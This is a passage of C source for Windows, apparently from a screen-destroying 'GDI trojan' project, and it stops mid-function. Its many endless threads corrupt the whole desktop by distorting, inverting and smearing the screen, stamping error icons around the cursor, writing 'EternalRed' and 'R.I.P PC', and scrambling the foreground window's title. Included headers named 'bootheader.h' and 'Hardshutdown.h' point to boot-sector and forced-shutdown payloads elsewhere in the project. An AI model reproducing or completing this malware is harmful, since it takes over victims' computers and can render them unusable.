﻿#include "main.h"
#include "sound.h"
#include "gdi_sab.h"
#include "bootheader.h"
#include "Hardshutdown.h"
//Default GDI
DWORD WINAPI mouse(LPVOID lpParam)
{
	ULONGLONG uVar1;
	DWORD64 uVar2;
	UINT uVar3;
	int iVar4;
	HDC hDC;
	UINT uVar5;
	int iVar6;
	int iVar7;
	tagCURSORINFO local_1c;

	uVar3 = GetSystemMetrics(0);
	iVar4 = GetSystemMetrics(1);
	hDC = GetDC((HWND)0x0);
	do {
		do {
			while (true) {
				while (true) {
					uVar1 = __rdtsc();
					iVar7 = 0;
					uVar5 = (UINT)uVar1 & 3;
					if ((uVar1 & 3) != 0) break;
					uVar2 = __rdtsc();
					uVar5 = (UINT)uVar2 ^ (UINT)uVar2 << 0xd;
					uVar5 = uVar5 ^ uVar5 << 0x11;
					uVar5 = (uVar5 << 5 ^ uVar5) % uVar3;
					if (0 < iVar4) {
						do {
							local_1c.cbSize = 0x14;
							GetCursorInfo(&local_1c);
							DrawIcon(hDC, uVar5, iVar7, local_1c.hCursor);
							uVar5 = uVar5 + 2;
							if ((int)uVar3 <= (int)uVar5) {
								iVar7 = iVar4;
							}
							Sleep(50);
							iVar7 = iVar7 + 2;
						} while (iVar7 < iVar4);
					}
				}
				if (uVar5 == 1) break;
				if (uVar5 == 2) {
					uVar2 = __rdtsc();
					uVar5 = (UINT)uVar2 ^ (UINT)uVar2 << 0xd;
					uVar5 = uVar5 ^ uVar5 << 0x11;
					uVar5 = (uVar5 << 5 ^ uVar5) % uVar3;
					if (0 < iVar4) {
						do {
							local_1c.cbSize = 0x14;
							GetCursorInfo(&local_1c);
							DrawIcon(hDC, uVar5, iVar7, local_1c.hCursor);
							uVar5 = uVar5 - 2;
							if ((int)uVar5 < 1) {
								iVar7 = iVar4;
							}
							Sleep(50);
							iVar7 = iVar7 + 2;
						} while (iVar7 < iVar4);
					}
				}
				else if (uVar5 == 3) {
					uVar2 = __rdtsc();
					uVar5 = (UINT)uVar2 ^ (UINT)uVar2 << 0xd;
					uVar5 = uVar5 ^ uVar5 << 0x11;
					uVar5 = (uVar5 << 5 ^ uVar5) % uVar3;
					iVar7 = GetSystemMetrics(1);
					while (0 < iVar7) {
						local_1c.cbSize = 0x14;
						GetCursorInfo(&local_1c);
						DrawIcon(hDC, uVar5, iVar7, local_1c.hCursor);
						uVar5 = uVar5 - 2;
						Sleep(50);
						iVar6 = 0;
						if (0 < (int)uVar5) {
							iVar6 = iVar7;
						}
						iVar7 = iVar6 + -2;
					}
				}
			}
			uVar2 = __rdtsc();
			uVar5 = (UINT)uVar2 ^ (UINT)uVar2 << 0xd;
			uVar5 = uVar5 ^ uVar5 << 0x11;
			uVar5 = (uVar5 << 5 ^ uVar5) % uVar3;
			iVar7 = GetSystemMetrics(1);
		} while (iVar7 < 1);
		do {
			local_1c.cbSize = 0x14;
			GetCursorInfo(&local_1c);
			DrawIcon(hDC, uVar5, iVar7, local_1c.hCursor);
			uVar5 = uVar5 + 2;
			Sleep(50);
			if ((int)uVar3 <= (int)uVar5) break;
			iVar7 = iVar7 + -2;
		} while (0 < iVar7);
	} while (true);
}

DWORD WINAPI mouse2(LPVOID lpParam)
{
	HDC hDC;
	tagCURSORINFO local_28;
	tagPOINT local_14;
	uint local_c;
	hDC = GetDC((HWND)0x0);
	do {
		GetCursorPos(&local_14);
		local_28.cbSize = 0x14;
		GetCursorInfo(&local_28);
		DrawIcon(hDC, local_14.x, local_14.y, local_28.hCursor);
		Sleep(10);
	} while (true);
}

DWORD WINAPI garbled(LPVOID lpParam)
{
	int uVar1;
	HWND hWnd;
	int iVar2;
	uint uVar3;
	CHAR* lpString;
	CHAR local_9;
	do {
		iVar2 = 0;
		do {
			uVar1 = rdtsc();
			uVar3 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
			uVar3 = uVar3 ^ uVar3 << 0x11;
			(&local_9)[iVar2] = (CHAR)((ulonglong)(uVar3 << 5 ^ uVar3) % 0x47);
			iVar2 = iVar2 + 1;
		} while (iVar2 < 0x46);
		lpString = &local_9;
		hWnd = GetForegroundWindow();
		SetWindowTextA(hWnd, lpString);
		Sleep(10);
	} while (true);
}

DWORD WINAPI clipping(LPVOID lpParam)
{
	int uVar1;
	ulonglong uVar2;
	uint uVar3;
	uint uVar4;
	HDC hdc;
	uint uVar5;
	uint x1;
	uint y1;
	uint uVar6;
	int cx;
	int local_14;
	int local_10;

	uVar3 = GetSystemMetrics(0);
	uVar4 = GetSystemMetrics(1);
	hdc = GetDC((HWND)0x0);
	do {
		do {
			while (true) {
				uVar1 = rdtsc();
				uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
				uVar5 = uVar5 ^ uVar5 << 0x11;
				x1 = (uVar5 << 5 ^ uVar5) % uVar3;
				uVar1 = rdtsc();
				uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
				uVar5 = uVar5 ^ uVar5 << 0x11;
				y1 = (uVar5 << 5 ^ uVar5) % uVar4;
				uVar2 = rdtsc();
				uVar5 = (uint)uVar2 & 3;
				uVar1 = rdtsc();
				uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
				uVar6 = uVar6 ^ uVar6 << 0x11;
				uVar1 = rdtsc();
				cx = (uVar6 ^ uVar6 << 5) % 300 + 200;
				uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
				uVar6 = uVar6 ^ uVar6 << 0x11;
				uVar6 = (uVar6 ^ uVar6 << 5) % 0x32;
				if ((uVar2 & 3) == 0) break;
				if (uVar5 == 1) {
					local_10 = 0;
					uVar5 = y1;
					if (uVar6 != 0xffffffec) {
						do {
							BitBlt(hdc, local_10 + x1, uVar5, cx, cx, hdc, x1, y1, SRCAND);
							BitBlt(hdc, local_10 + x1, uVar5, cx, cx, hdc, x1, y1, SRCPAINT);
							BitBlt(hdc, local_10 + x1, uVar5, cx, cx, hdc, x1, y1, SRCCOPY);
							Sleep(25);
							local_10 = local_10 + 10;
							uVar5 = uVar5 - 10;
						} while (local_10 < (int)(uVar6 + 0x14));
					}
				}
				else if (uVar5 == 2) {
					local_14 = 0;
					uVar5 = x1;
					if (uVar6 != 0xffffffec) {
						do {
							BitBlt(hdc, uVar5, y1 + local_14, cx, cx, hdc, x1, y1, SRCAND);
							BitBlt(hdc, uVar5, y1 + local_14, cx, cx, hdc, x1, y1, SRCPAINT);
							BitBlt(hdc, uVar5, y1 + local_14, cx, cx, hdc, x1, y1, SRCCOPY);
							Sleep(25);
							local_14 = local_14 + 10;
							uVar5 = uVar5 - 10;
						} while (local_14 < (int)(uVar6 + 0x14));
					}
				}
				else if ((uVar5 == 3) && (uVar6 != 0xffffffec)) {
					local_14 = (uVar6 + 0x13) / 10 + 1;
					uVar5 = x1;
					do {
						BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCAND);
						BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCPAINT);
						BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCCOPY);
						Sleep(25);
						uVar5 = uVar5 - 10;
						local_14 = local_14 + -1;
					} while (local_14 != 0);
				}
			}
		} while (uVar6 == 0xffffffec);
		local_10 = (uVar6 + 0x13) / 10 + 1;
		uVar5 = x1;
		do {
			BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCAND);
			BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCPAINT);
			BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCCOPY);
			Sleep(25);
			uVar5 = uVar5 + 10;
			local_10 = local_10 + -1;
		} while (local_10 != 0);
	} while (true);
}

//GDI Designation

//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\

//payload1

DWORD WINAPI gdi1(LPVOID lpParam)
{
	int uVar1;
	int uVar2;
	int uVar3;
	int uVar4;
	uint uVar5;
	uint uVar6;
	HDC hdc;
	uint uVar7;
	uint uVar8;

	uVar5 = GetSystemMetrics(0);
	uVar6 = GetSystemMetrics(1);
	hdc = GetDC((HWND)0x0);
	do
	{
		uVar1 = rdtsc();
		uVar2 = rdtsc();
		uVar3 = rdtsc();
		uVar7 = (uint)uVar3 ^ (uint)uVar3 << 0xd;
		uVar7 = uVar7 ^ uVar7 << 0x11;
		uVar3 = rdtsc();
		uVar8 = (uint)uVar3 ^ (uint)uVar3 << 0xd;
		uVar8 = uVar8 ^ uVar8 << 0x11;
		uVar3 = rdtsc();
		uVar4 = rdtsc();
		BitBlt(hdc, (uint)uVar4 & rand() % 5, (uint)uVar3 & rand() % 5, (uVar8 << 10 ^ uVar8) % uVar5, (uVar7 << 10 ^ uVar7) % uVar6, hdc, (uint)uVar2 & rand() % 5, (uint)uVar1 & rand() % 5, SRCCOPY);
		Sleep(1);
	} while (true);
}

DWORD WINAPI gdi2(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	HDC hdc, hdcMem; HBITMAP hbm;
	for (int i = 0;; i++, i %= 6)
	{
		hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc);
		hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			int x = i * w + i, y = i * h + i, f = (y | y + y + -1 + x + w / h);
			((BYTE*)(data + i))[5] = 1;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCINVERT);
		DeleteObject(hbm); DeleteObject(hdcMem);
		DeleteObject(hdc);
		Sleep(50);
	}
}

//payload2

DWORD WINAPI gdi3(LPVOID lpParam)
{
	int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	POINT wPt[3];
	RECT wRect;
	HDC desk = GetDC(0);
	double moveangle = 0;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	LPCSTR text = 0;
	while (1)
	{
		hdc = GetDC(0);
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		BitBlt(desk, 10, 10, sw, sh, desk, 10, 10, SRCCOPY);
		StretchBlt(desk, 5, 5, sw - 10, sh - 10, desk, 0, 0, sw, sh, SRCCOPY);
		BitBlt(hdc, rand() % 5, rand() % 5, w, h, hdc, rand() % 5, rand() % 5, !(rand() % 3) ? SRCAND : SRCCOPY);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 15;
		wPt[0].y = wRect.top + 30;
		wPt[1].x = wRect.right - 10;
		wPt[1].y = wRect.top - 10;
		wPt[2].x = wRect.left + 5;
		wPt[2].y = wRect.bottom + 12.5;
		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		BitBlt(hdc, -5, 0, x, y, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, x - 5, 0, x, y, hdc, 0, 0, SRCCOPY);
		Sleep(5);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

//payload3

DWORD WINAPI gdi4(LPVOID lpParam)
{
	HDC hdc;
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	LPCSTR text = 0;
	while (1)
	{
		hdc = GetDC(0);
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		text = "EternalRed";
		SetBkMode(desk, TRANSPARENT);
		SetTextColor(desk, RGB(rand() % 500, rand() % 500, rand() % 500));
		HFONT font = CreateFontA(350, 170, 0, 0, FW_THIN, 0, rand() % 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Shadows Into Light");
		SelectObject(desk, font);
		TextOutA(desk, sw - 1925, sh - 1050, text, strlen(text));
		TextOutA(desk, sw - 1925, sh - 400, text, strlen(text));
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
		DeleteObject(font);
		BitBlt(desk, xorshift32() % 10, xorshift32() % 10, sw, sh, desk, xorshift32() % 10, xorshift32() % 10, SRCCOPY);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCPAINT);
		Sleep(100);
	}
}

DWORD WINAPI gdi5(LPVOID lpParam)
{
	HDC hDC;
	tagCURSORINFO local_28;
	tagPOINT local_14;
	uint local_c;
	hDC = GetDC((HWND)0x0);
	HDC hdc = GetDC(0);
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int rx;
	int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
	double moveangle = 0;
	while (1)
	{
		desk = GetDC(0);
		hdc = GetDC(0);
		SeedXorshift32(__rdtsc());
		rx = xorshift32() % sw;
		int ry = xorshift32() % sh;
		if (xorshift32() % 5 == 3) InvalidateRect(0, 0, 0);
		int ax = (int)(cos(moveangle) * 5);
		int ay = (int)(sin(moveangle) * 5);
		BitBlt(desk, ax, ay, sw, sh, desk, 0, 0, SRCCOPY);
		moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		BitBlt(hdc, -20, 0, x, y, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, x - 20, 0, x, y, hdc, 0, 0, SRCCOPY);
		SeedXorshift32(__rdtsc());
		GetCursorPos(&local_14);
		local_28.cbSize = 0x14;
		GetCursorInfo(&local_28);
		RedrawWindow(0, 0, 0, 133);
		Sleep(25);
		DrawIcon(hDC, local_14.x - 10, local_14.y - 10, LoadIcon(0, IDI_ERROR));
		DrawIcon(hDC, local_14.x + 10, local_14.y + 10, LoadIcon(0, IDI_ERROR));
		DrawIcon(hDC, local_14.x - 10, local_14.y + 10, LoadIcon(0, IDI_ERROR));
		DrawIcon(hDC, local_14.x + 10, local_14.y - 10, LoadIcon(0, IDI_ERROR));
		DrawIcon(hDC, local_14.x - 40, local_14.y - 40, LoadIcon(0, IDI_WARNING));
		DrawIcon(hDC, local_14.x + 40, local_14.y + 40, LoadIcon(0, IDI_WARNING));
		DrawIcon(hDC, local_14.x - 40, local_14.y + 40, LoadIcon(0, IDI_WARNING));
		DrawIcon(hDC, local_14.x + 40, local_14.y - 40, LoadIcon(0, IDI_WARNING));
		DrawIcon(hDC, local_14.x - 70, local_14.y - 70, LoadIcon(0, IDI_INFORMATION));
		DrawIcon(hDC, local_14.x + 70, local_14.y + 70, LoadIcon(0, IDI_INFORMATION));
		DrawIcon(hDC, local_14.x - 70, local_14.y + 70, LoadIcon(0, IDI_INFORMATION));
		DrawIcon(hDC, local_14.x + 70, local_14.y - 70, LoadIcon(0, IDI_INFORMATION));
		DrawIcon(hDC, local_14.x - 100, local_14.y - 100, LoadIcon(0, IDI_QUESTION));
		DrawIcon(hDC, local_14.x + 100, local_14.y + 100, LoadIcon(0, IDI_QUESTION));
		DrawIcon(hDC, local_14.x - 100, local_14.y + 100, LoadIcon(0, IDI_QUESTION));
		DrawIcon(hDC, local_14.x + 100, local_14.y - 100, LoadIcon(0, IDI_QUESTION));
		DrawIcon(hDC, local_14.x - 130, local_14.y - 130, LoadIcon(0, IDI_APPLICATION));
		DrawIcon(hDC, local_14.x + 130, local_14.y + 130, LoadIcon(0, IDI_APPLICATION));
		DrawIcon(hDC, local_14.x - 130, local_14.y + 130, LoadIcon(0, IDI_APPLICATION));
		DrawIcon(hDC, local_14.x + 130, local_14.y - 130, LoadIcon(0, IDI_APPLICATION));
		Sleep(100);
	}
}

//payload4

DWORD WINAPI gdi6(LPVOID lpParam)
{
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	HDC desk = GetDC(0);
	int right;
	uint uVar1;
	int iVar2;
	int iVar3;
	HDC hdc;
	uint uVar4;
	uint uVar5;
	uint uVar6;
	HBRUSH h;
	int left;
	int local_8;

	iVar2 = GetSystemMetrics(0);
	iVar3 = GetSystemMetrics(1);
	hdc = GetDC((HWND)0x0);
	local_8 = 0;
	do
	{
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		SelectObject(desk, CreateHatchBrush(rand() % 5, RGB(rand() % 150, rand() % 150, rand() % 150)));
		BitBlt(desk, rand() % 1, rand() % 1, sw, sh, desk, rand() % 1, rand() % 1, 0x2837E28);
		uVar1 = rdtsc();
		uVar4 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
		uVar4 = uVar4 ^ uVar4 << 0x11;
		uVar4 = uVar4 << 5 ^ uVar4;
		uVar1 = rdtsc();
		uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
		uVar5 = uVar5 ^ uVar5 << 0x11;
		uVar5 = uVar5 << 5 ^ uVar5;
		uVar1 = rdtsc();
		uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
		uVar6 = uVar6 ^ uVar6 << 0x11;
		h = CreateSolidBrush(((uint)((ulonglong)(uVar6 << 5 ^ uVar6) * 0x8080808081 >> 0x27) & 0xff) << 0x10 | (uVar5 / 0xff + uVar5 & 0xff) << 8 | uVar4 / 0xff + uVar4 & 0xff);
		SelectObject(hdc, h);
		if (0 < iVar2)
		{
			left = 0;
			do
			{
				right = left + 80;
				Ellipse(hdc, left, local_8 + 80, right, local_8);
				left = right;
			} while (right < iVar2);
		}
		local_8 = local_8 + 80;
		if (iVar3 <= local_8) {
			local_8 = 0;
		}
		Sleep(2.5);
	} while (true);
}

//payload5

DWORD WINAPI gdi7(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1)
	{
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 500, rand() % 500, rand() % 500)));
		Ellipse(desk, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
		Rectangle(desk, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
		RoundRect(desk, rand() % 2500, rand() % 2500, rand() % 2500, rand() % 2500, rand() % 2500, rand() % 2500);
		BitBlt(desk, rand() % 20, rand() % 20, sw, sh, desk, rand() % 20, rand() % 20, SRCCOPY);
		BitBlt(desk, rand() % 5, rand() % 5, sw, sh, desk, rand() % 5, rand() % 5, !(rand() % 2) ? SRCPAINT : SRCAND);
		Rectangle(desk, 50, 50, 200, 150);
		Sleep(25);
	}
}

//payload6

DWORD WINAPI gdi8(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	LPCSTR text = 0;
	HWND v3;
	HBITMAP h;
	HDC hdcSrc;
	HDC hdc;
	void* lpvBits;
	int nHeight;
	int nWidth;
	DWORD v12;
	int j;
	int v14;
	int i;
	v12 = GetTickCount();
	nWidth = GetSystemMetrics(0);
	nHeight = GetSystemMetrics(1);
	lpvBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), 0x3000u, 4u);
	for (i = 0; ; i = (i + 5) % 2)
	{
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		text = "R.I.P PC";
		SetBkMode(desk, TRANSPARENT);
		SetTextColor(desk, RGB(rand() % 500, rand() % 500, rand() % 500));
		HFONT font = CreateFontA(12.5, 6.25, 0, 0, FW_THIN, 0, rand() % 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Shadows Into Light");
		SelectObject(desk, font);
		TextOutA(desk, rand() % sw, rand() % sh, text, strlen(text));
		hdc = GetDC(0);
		hdcSrc = CreateCompatibleDC(hdc);
		h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
		SelectObject(hdcSrc, h);
		BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
		GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
		v14 = 0;
		if (GetTickCount() - v12 > 0xA)
			rand();
		for (j = 0; nHeight * nWidth > j; ++j)
		{
			if (!(j % nHeight) && !(rand() % 600))
				v14 = 25;
			*((BYTE*)lpvBits + 4 * j + v14) -= 15;
		}
		SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
		BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
		DeleteObject(h);
		DeleteObject(hdcSrc);
		DeleteObject(hdc);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
		DeleteObject(font);
	}
}

//payload7

DWORD WINAPI gdi9(LPVOID lpParam)
{
	int rx;
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double moveangle = 0;
	while (1) {
		desk = GetDC(0);
		rx = xorshift32() % sw;
		int ry = xorshift32() % sh;
		SeedXorshift32(__rdtsc());
		int ax = (int)(cos(moveangle) * 5);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 500, rand() % 500, rand() % 500)));
		int ay = (int)(sin(moveangle) * 5);
		BitBlt(desk, rx, 10, 100, sh, desk, rx, 0, RGBBRUSH);
		BitBlt(desk, rx, -10, -100, sh, desk, rx, 0, RGBBRUSH);
		StretchBlt(desk, ax, ay, sw, sh, desk, 5, 5, sw - 10, sh - 10, SRCCOPY);
		moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		Sleep(25);
	}
}

//payload8

DWORD WINAPI gdi10(LPVOID lpParam)
{
	while (1)
	{
		SeedXorshift32(__rdtsc());
		int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		HDC desk = GetDC(0);
		gdi10_sab();
		gdi10_sab();
		gdi10_sab();
		FreeConsole();
	}
}

//payload9

DWORD WINAPI gdi11(LPVOID lpParam)
{
	int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	POINT wPt[3];
	RECT wRect;
	HDC desk = GetDC(0);
	double moveangle = 0;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	LPCSTR text = 0;
	while (1)
	{
		hdc = GetDC(0);
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left;
		wPt[0].y = wRect.top + 62.5;
		wPt[1].x = wRect.right - 62.5;
		wPt[1].y = wRect.top - 62.5;
		wPt[2].x = wRect.left + 125;
		wPt[2].y = wRect.bottom;
		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
	}
}

//payload10

DWORD WINAPI gdi12(LPVOID lpParam)
{
	uint uVar1;
	uint uVar2;
	int cy;
	HDC hdc;
	uint uVar3;
	uint uVar4;

	uVar2 = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	hdc = GetDC((HWND)0x0);
	do {
		uVar1 = rdtsc();
		uVar3 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
		uVar3 = uVar3 ^ uVar3 << 0x11;
		uVar3 = (uVar3 << 5 ^ uVar3) % uVar2;
		uVar1 = rdtsc();
		uVar4 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
		uVar4 = uVar4 ^ uVar4 << 0x11;
		uVar4 = uVar4 ^ uVar4 << 5;
		BitBlt(hdc, uVar3, 0, 100, cy, hdc, uVar3,
			uVar4 + (((uint)((ulonglong)uVar4 * 0x124924925 >> 0x21) & 0xfffffff8) - uVar4 / 0xe) *-2 + -5, 0xee0086);
		Sleep(1);
	} while (true);
}

DWORD WINAPI gdi13(LPVOID lpParam)
{
	int sx = 0, sy = 0;
	int uVar1;
	ulonglong uVar2;
	uint uVar3;
	uint uVar4;
	HDC hdc;
	HPEN h;
	int right;
	uint uVar5;
	int top;
	int bottom;
	int left;
	int local_28;
	int local_1c;
	HBRUSH local_14;
	int local_10;
	uint local_c;
	uint local_8;

	uVar3 = GetSystemMetrics(0);
	uVar4 = GetSystemMetrics(1);
	hdc = GetDC((HWND)0x0);
	uVar1 = rdtsc();
	uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
	uVar5 = uVar5 ^ uVar5 << 0x11;
	local_8 = (uVar5 << 5 ^ uVar5) % uVar3;
	uVar1 = rdtsc();
	uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
	uVar5 = uVar5 ^ uVar5 << 0x11;
	local_c = (uVar5 << 5 ^ uVar5) % uVar4;
	local_14 = CreateSolidBrush(0xff);
	h = CreatePen(0, 2, 0xffffff);
	LPCWSTR lpText = L" ";
	HFONT font = CreateFontA(rand() % 50, 50, 0, 0, FW_THIN, 0, rand() % 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Shadows Into Light");
	SelectObject(hdc, font);
	local_28 = 0;
	hdc = GetWindowDC(GetDesktopWindow());
	sx = GetSystemMetrics(0);
	sy = GetSystemMetrics(1);
	SetTextColor(hdc, RGB(rand() % 500, rand() % 500, rand() % 500));
	SetBkColor(hdc, RGB(500, 0, 0));
	do
	{
		if (local_28 == 1) {
			local_14 = CreateSolidBrush(0xa5ff);
		}
		else if (local_28 == 2) {
			local_14 = CreateSolidBrush(0xffff);
		}
		else if (local_28 == 3) {
			local_14 = CreateSolidBrush(0xff00);
		}
		else if (local_28 == 4) {
			local_14 = CreateSolidBrush(0xffff00);
		}
		else if (local_28 == 5) {
			local_14 = CreateSolidBrush(0xff0000);
		}
		else if (local_28 == 6) {
			local_14 = CreateSolidBrush(0xd30094);
		}
		else if (local_28 == 7) {
			local_14 = CreateSolidBrush(0xff00ff);
		}
		else if (local_28 == 8) {
			local_14 = CreateSolidBrush(0xff);
			local_28 = 0;
		}
		SelectObject(hdc, local_14);
		SelectObject(hdc, h);
		if (((((int)uVar3 <= (int)local_8) || ((int)uVar4 <= (int)local_c)) || ((int)local_8 < 1)) ||
			((int)local_c < 1)) {
			uVar1 = rdtsc();
			uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
			uVar5 = uVar5 ^ uVar5 << 0x11;
			local_8 = (uVar5 << 5 ^ uVar5) % uVar3;
			uVar1 = rdtsc();
			uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
			uVar5 = uVar5 ^ uVar5 << 0x11;
			local_c = (uVar5 << 5 ^ uVar5) % uVar4;
		}
		uVar2 = rdtsc();
		left = local_8 - 0x3c;
		top = local_c - 0x3c;
		uVar5 = (uint)uVar2 & 3;
		right = local_8 + 0x3c;
		bottom = local_c + 0x3c;
		local_1c = 10;
		local_10 = right;
		do {
			if ((uVar2 & 3) == 0) {
				Rectangle(hdc, left, top, right, bottom);
				local_8 = local_8 + 0x14;
				left = left + 0x14;
				local_10 = local_10 + 0x14;
				bottom = bottom + 0x14;
				local_c = local_c + 0x14;
				top = top + 0x14;
			LAB_004020f7:
				TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
				Sleep(1);
				right = local_10;
			}
			else {
				if (uVar5 == 1) {
					Ellipse(hdc, left, top, right, bottom);
					local_8 = local_8 + 0x14;
					local_10 = local_10 + 0x14;
					left = left + 0x14;
				LAB_004020ed:
					local_c = local_c - 0x14;
					bottom = bottom + -0x14;
					top = top + -0x14;
					goto LAB_004020f7;
					TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
					Sleep(1);
				}
				if (uVar5 == 2) {
					Rectangle(hdc, left, top, right, bottom);
					local_8 = local_8 - 0x14;
					left = left + -0x14;
					local_10 = local_10 + -0x14;
					bottom = bottom + 0x14;
					local_c = local_c + 0x14;
					top = top + 0x14;
					goto LAB_004020f7;
					TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
					Sleep(1);
				}
				if (uVar5 == 3) {
					Rectangle(hdc, left, top, right, bottom);
					local_8 = local_8 - 0x14;
					local_10 = local_10 + -0x14;
					left = left + -0x14;
					goto LAB_004020ed;
					TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
					Sleep(1);
				}
			}
			local_1c = local_1c + -1;
		} while (local_1c != 0);
		local_28 = local_28 + 1;
	} while (true);
}

//payload11

RECT wRect;
POINT wPt[3];
VOID gdi14_waterfall1(int counter)
{
	HWND upWnd = GetForegroundWindow();
	HDC upHdc = GetDC(upWnd);
	HDC desktop = GetDC(NULL);
	upWnd = GetForegroundWindow();
	upHdc = GetDC(upWnd);
	desktop = GetDC(NULL);
	SeedXorshift32(__rdtsc());
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	HDC deskMem = CreateCompatibleDC(desk);
	HBITMAP screenshot = CreateCompatibleBitmap(desk, sw, sh);
	SelectObject(deskMem, screenshot);
	GetWindowRect(GetDesktopWindow(), &wRect);
	wPt[0].x = wRect.left + counter;
	wPt[0].y = wRect.top - counter;
	wPt[1].x = wRect.right + counter;
	wPt[1].y = wRect.top + counter;
	wPt[2].x = wRect.left - counter;
	wPt[2].y = wRect.bottom - counter;
